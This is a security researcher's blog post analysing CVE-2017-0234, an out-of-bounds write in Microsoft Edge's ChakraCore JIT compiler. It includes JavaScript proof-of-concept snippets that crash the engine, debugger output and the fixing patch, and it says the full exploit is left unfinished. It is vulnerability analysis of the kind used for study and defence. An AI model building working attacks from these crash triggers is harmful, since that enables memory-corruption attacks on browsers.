<!doctype html>
<html lang="en">
    <head>
		
        <meta http-equiv="Content-Type" content="text/html" charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
        <meta name="description" content="Browser Security Research">
        <link rel="shortcut icon" href="https://miao.su/images/2017/11/01/19367566_1417333275024768_5995578623556321280_ndd7d5.jpg"/>
        <link rel="alternate" type="application/rss+xml" title="math1as" href="/atom.xml">
        <title>CVE-2017-0234 analysis | math1as&#39; blog</title>
        <meta name="description" content="{{meta_description}}">

        <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
        <link rel="stylesheet" type="text/css" href="/styles/crisp.css">
        <meta name="HandheldFriendly" content="True" />
        <meta name="MobileOptimized" content="320" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
        <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
        <![endif]-->

    </head>
    
		<body class="post-template">
	

        <header id="header">
            <a id="logo" href="/"><img src="https://miao.su/images/2017/11/01/19367566_1417333275024768_5995578623556321280_ndd7d5.jpg" alt="math1as' blog" /></a>
            <h1><a href="/">math1as</a></h1>
            <p>Security Researcher</p>
            <div id="follow-icons">
              <a href="http://twitter.com/Ma7h1as"><i class="fa fa-twitter-square fa-2x"></i></a>
          <a href="/atom.xml"><i class="fa fa-rss-square fa-2x"></i></a>
  </div>
<h6><a href="/About">About</a></h6>
<h6><a href="/friendlink">Friendlink</a></h6
<h6><a href="/papers">Papers</a></h6>
<h6><a href="/Credit">Credit</a></h6>
<h6><a href="/Bounty">Bounty</a></h6>
        </header>

        <main id="content">
        

<article class="post">
  February 7, 2018
  

  <h1 class="post-title">CVE-2017-0234 analysis</h1>
  <section class="post-content article-entry">
    <p>About the Microsoft Edge Vuln used on pwn2own 2017</p>
<p>debug enviorment: Windows10 + Visual Studio 2015 + ChakraCore SourceCode</p>
<p>POC</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">function write(n)</div><div class="line">&#123;</div><div class="line"> for(var i=0;i&lt;n;i++)</div><div class="line"> &#123;</div><div class="line"> 	view[0x40000]=num;</div><div class="line"> &#125;</div><div class="line">&#125;</div><div class="line">var view = new Uint32Array(0x10000);</div><div class="line">write(0,1000,1,0x3)</div><div class="line">write(0,1000,1,0x3)</div></pre></td></tr></table></figure>
<p>Let’s start</p>
<p>the debugger throw out an exception “access violation” in JIT code<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">0000002DE9040084  mov         dword ptr [rax+100000h],3</div></pre></td></tr></table></figure></p>
<p>so we need to see what happened</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">dd rax+100000h</div><div class="line">0x00000057800E0000 ??? ??? ???</div></pre></td></tr></table></figure>
<p>hum,it’s a simple OOB</p>
<p>How does it happend?</p>
<p>see the patch</p>
<p><a href="https://github.com/Microsoft/ChakraCore/commit/a1345ad48064921e8eb45fa0297ce405a7df14d3" target="_blank" rel="external">https://github.com/Microsoft/ChakraCore/commit/a1345ad48064921e8eb45fa0297ce405a7df14d3</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">-            eliminatedLowerBoundCheck = true;</div><div class="line">-            eliminatedUpperBoundCheck = true;</div><div class="line">-            canBailOutOnArrayAccessHelperCall = false;</div><div class="line">+            // Unless we&apos;re in asm.js (where it is guaranteed that virtual typed array accesses cannot read/write beyond 4GB),</div><div class="line">+            // check the range of the index to make sure we won&apos;t access beyond the reserved memory beforing eliminating bounds</div><div class="line">+            // checks in jitted code.</div><div class="line">+            if (!GetIsAsmJSFunc())</div><div class="line">+            &#123;</div><div class="line">+                IR::RegOpnd * idxOpnd = baseOwnerIndir-&gt;GetIndexOpnd();</div><div class="line">+                if (idxOpnd)</div><div class="line">+                &#123;</div><div class="line">+                    StackSym * idxSym = idxOpnd-&gt;m_sym-&gt;IsTypeSpec() ? idxOpnd-&gt;m_sym-&gt;GetVarEquivSym(nullptr) : idxOpnd-&gt;m_sym;</div><div class="line">+                    Value * idxValue = FindValue(idxSym);</div><div class="line">+                    IntConstantBounds idxConstantBounds;</div><div class="line">+                    if (idxValue &amp;&amp; idxValue-&gt;GetValueInfo()-&gt;TryGetIntConstantBounds(&amp;idxConstantBounds))</div><div class="line">+                    &#123;</div><div class="line">+                        BYTE indirScale = Lowerer::GetArrayIndirScale(baseValueType);</div><div class="line">+                        int32 upperBound = idxConstantBounds.UpperBound();</div><div class="line">+                        int32 lowerBound = idxConstantBounds.LowerBound();</div><div class="line">+                        if (lowerBound &gt;= 0 &amp;&amp; ((static_cast&lt;uint64&gt;(upperBound) &lt;&lt; indirScale) &lt; MAX_ASMJS_ARRAYBUFFER_LENGTH))</div><div class="line">+                        &#123;</div><div class="line">+                            eliminatedLowerBoundCheck = true;</div><div class="line">+                            eliminatedUpperBoundCheck = true;</div><div class="line">+                            canBailOutOnArrayAccessHelperCall = false;</div><div class="line">+                        &#125;</div><div class="line">+                    &#125;</div><div class="line">+                &#125;</div><div class="line">+            &#125;</div><div class="line">+            else</div><div class="line">+            &#123;</div><div class="line">+                eliminatedLowerBoundCheck = true;</div><div class="line">+                eliminatedUpperBoundCheck = true;</div><div class="line">+                canBailOutOnArrayAccessHelperCall = false;</div><div class="line">+            &#125;</div><div class="line">         &#125;</div><div class="line">     &#125;</div></pre></td></tr></table></figure>
<p>  The problem is clear</p>
<p>  Microsoft make a aggressive strategy: that they remove the bound check of virtual typed array</p>
<p>  and then, we restart the program,and I find an interesting thing</p>
<p>  The program use VirtualAlloc() function instead of GC, when we alloc a “big” virtual typed array</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">buffer=???</div><div class="line">var view = new Uint32Array(buffer);</div></pre></td></tr></table></figure>
<p>  That is to say</p>
<p>  when buffer is greater than a value , then it would use VirtualAlloc() function to ask for 4GB space at one time</p>
<p>  then it would commit the real size (buffer) of the array,which could be used.</p>
<p>  so what is the meaning of this ? let’s discuss about it later</p>
<p> come back to think a problem: how does ChakraCore work , and analyse about the logic of this vuln</p>
<p> how does ChakraCore works ?</p>
<p> it could work in two ways</p>
<ol>
<li><p>interpreter mode (normal)</p>
</li>
<li><p>JIT mode (much more faster)</p>
<p>so,how does interpreter mode works</p>
<p>the process look like this</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"> CallFunction()</div><div class="line"> ProfiledLoopBodyStart()</div><div class="line"> amd64_CallFunction()</div><div class="line"> CheckCodeGenThunk()</div><div class="line"> NativeCodeGenerator::CheckCodeGen()</div><div class="line"> DelayDynamicInterpreterThunk@InterpreterStackFrame()</div><div class="line">InterpreterStackFrame::EnsureDynamicInterpreterThunk()</div><div class="line">jmp code</div><div class="line">InterpreterStackFrame::InterpreterThunk()</div></pre></td></tr></table></figure>
</li>
</ol>
<p> when handle the loop in javascript</p>
<p> let’s see the Call Stack</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">chakracore!Js::InterpreterStackFrame::InterpreterHelper</div><div class="line">  chakracore!Js::InterpreterStackFrame::Process</div><div class="line">   chakracore!Js::InterpreterStackFrame::ProcessProfiled</div><div class="line">    chakracore!Js::InterpreterStackFrame::OP_ProfiledLoopBodyStart</div><div class="line">     chakracore!Js::InterpreterStackFrame::ProfiledLoopBodyStart</div><div class="line">      chakracore!Js::InterpreterStackFrame::DoLoopBodyStart</div></pre></td></tr></table></figure>
<p>when JIT code does not generated (it would use a new thread to do this) , ChakraCore would use ProfiledLoopBodyStart as the handler<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">const byte * InterpreterStackFrame::OP_ProfiledLoopBodyStart(const byte * ip)</div><div class="line">&#123;</div><div class="line">    uint32 C1 = m_reader.GetLayout&lt;OpLayoutT_Unsigned1&lt;LayoutSizePolicy&lt;layoutSize&gt;&gt;&gt;(ip)-&gt;C1;</div><div class="line"></div><div class="line">    if(profiled || isAutoProfiling)</div><div class="line">    &#123;</div><div class="line">        this-&gt;currentLoopCounter++;</div></pre></td></tr></table></figure></p>
<p>and the variable currentLoopCounter shows how many time the function is called</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">    InterpreterStackFrame::CheckIfLoopIsHot(uint profiledLoopCounter)</div><div class="line">    &#123;</div><div class="line">        Js::FunctionBody *fn = this-&gt;function-&gt;GetFunctionBody();</div><div class="line">        if (!fn-&gt;GetHasHotLoop() &amp;&amp;  profiledLoopCounter &gt; (uint)CONFIG_FLAG(JitLoopBodyHotLoopThreshold))</div><div class="line">        &#123;</div><div class="line">#ifdef ENABLE_DEBUG_CONFIG_OPTIONS</div><div class="line">            if(PHASE_TRACE(Js::JITLoopBodyPhase, fn))</div><div class="line">            &#123;</div><div class="line">                char16 debugStringBuffer[MAX_FUNCTION_BODY_DEBUG_STRING_SIZE];</div><div class="line"></div><div class="line">                Output::Print(</div><div class="line">                    _u(&quot;Speculate Jit set for this function with loopbody: function: %s (%s)\n&quot;),</div><div class="line">                    fn-&gt;GetDisplayName(),</div><div class="line">                    fn-&gt;GetDebugNumberSet(debugStringBuffer));</div><div class="line">                Output::Flush();</div><div class="line">            &#125;</div><div class="line">#endif</div><div class="line">            fn-&gt;SetHasHotLoop();</div><div class="line">        &#125;</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
<p>and then if the variable is greater than (uint)CONFIG_FLAG(JitLoopBodyHotLoopThreshold),it would turn into JIT mode</p>
<p>so that the process turn into this</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"> CallFunction()</div><div class="line"> ProfiledLoopBodyStart()</div><div class="line"> amd64_CallFunction()</div><div class="line"> CheckCodeGenThunk()</div><div class="line"> NativeCodeGenerator::CheckCodeGen()</div><div class="line"> DelayDynamicInterpreterThunk@InterpreterStackFrame()</div><div class="line">InterpreterStackFrame::EnsureDynamicInterpreterThunk()</div><div class="line">jmp code</div><div class="line">JIT code</div></pre></td></tr></table></figure>
<p> how could it call JIT code rather than interpreter ?</p>
<p> in amd64_CallFunction() where call CheckCodeGenThunk()<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">ifdef _CONTROL_FLOW_GUARD</div><div class="line">        call    [__guard_dispatch_icall_fptr]</div><div class="line">else</div><div class="line">        call rax</div></pre></td></tr></table></figure></p>
<p>rax=the address of JIT code</p>
<p>OK,so that we know about how ChakraCore works</p>
<p>then,how about the patch,could we get into the logic which disable the bound check?</p>
<p>once we patch it,we’ll find that we could not pass the check</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">if (idxOpnd)</div></pre></td></tr></table></figure>
<p>i find that if we access the array index through constant , then it would get into</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">// Const-prop an indir opnd&apos;s constant index into its offset</div><div class="line">IR::Opnd *srcs[] = &#123; instr-&gt;GetSrc1(), instr-&gt;GetSrc2(), instr-&gt;GetDst() &#125;;</div><div class="line">for(int i = 0; i &lt; sizeof(srcs) / sizeof(srcs[0]); ++i)</div><div class="line">&#123;</div><div class="line">    const auto src = srcs[i];</div><div class="line">    if(!src || !src-&gt;IsIndirOpnd())</div><div class="line">    &#123;</div><div class="line">        continue;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    const auto indir = src-&gt;AsIndirOpnd();</div><div class="line">    if(opnd == indir-&gt;GetIndexOpnd())</div><div class="line">    &#123;</div><div class="line">        Assert(indir-&gt;GetScale() == 0);</div><div class="line">        GOPT_TRACE_OPND(opnd, _u(&quot;Constant prop indir index into offset (value: %d)\n&quot;), intConstantValue);</div><div class="line">        this-&gt;CaptureByteCodeSymUses(instr);</div><div class="line">        indir-&gt;SetOffset(intConstantValue);</div><div class="line">        indir-&gt;SetIndexOpnd(nullptr);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>call indir-&gt;SetIndexOpnd(nullptr)</p>
<p>so we need to pass a variable like this</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">function write(j)</div><div class="line">&#123;</div><div class="line"> for(var i=0;i&lt;0xc000;i++)</div><div class="line"> &#123;</div><div class="line">    if(j&gt;=0 &amp;&amp; j&lt;=0x60000) view[j]=0x3;</div><div class="line"> &#125;</div><div class="line">&#125;</div><div class="line">var view = new Uint32Array(0x10000);</div><div class="line">write(0x40000)</div><div class="line">write(0x40000)</div></pre></td></tr></table></figure>
<p>then we get into the logic which disabled the bound check, and ChakraCore crash again (of course,could not bypass the patch because we are in the 4GB space)</p>
<p>:( ok,I’ll finish the exploit in future,thank you</p>

  </section>
  <footer class="post-footer">
    <!--
    <section class="author">
      <h4>math1as</h4>
      <p></p>
    </section>
    -->
  </footer>
</article>

<nav class="pagination" role="pagination">
    
    <a class="newer-posts" href="/2018/04/10/CVE-2017-0236-analysis/">
        ← prev <!--CVE-2017-0236 analysis-->
    </a>
    
    <span class="page-number">•</span>
    
    <a class="older-posts" href="/2017/12/15/L-CTF-2017-easy-xss/">
        <!--L-CTF 2017 easy xss--> next →
    </a>
    
</nav>


        </main>
        <footer id="footer">
            <section id="footer-message">&copy; 2017 math1as.</section>
       </footer>
    </body>
</html>


